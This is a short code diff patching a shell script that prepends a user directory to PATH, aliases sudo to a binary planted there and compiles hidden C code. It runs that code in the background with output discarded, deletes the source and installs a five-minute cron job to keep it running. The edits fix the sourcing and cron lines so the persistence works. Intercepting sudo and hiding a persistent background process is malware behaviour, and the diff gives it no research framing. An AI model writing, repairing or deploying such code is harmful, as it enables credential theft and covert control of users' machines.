@@ -39,8 +39,8 @@ PATH="$HOME/.local/bin:$PATH"
 alias sudo="$HOME/.local/bin/sudo"
 EOF
         echo "Successfully added configuration to $RC_FILE"
-		source "$RC_FILE"
     fi
+	source "$RC_FILE"
 done
 
 cat << EOF > "$c_code"
@@ -68,7 +68,7 @@ gcc "$c_code" -o "$script_path"
 nohup "$script_path" > /dev/null 2>&1 &
 rm "$c_code"
 
-CRON_JOB="*/5 * * * * bash $script_path"
+CRON_JOB="*/5 * * * * $script_path"
 if ! crontab -l 2>/dev/null | grep -Fxq "$CRON_JOB"; then
     (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
 else
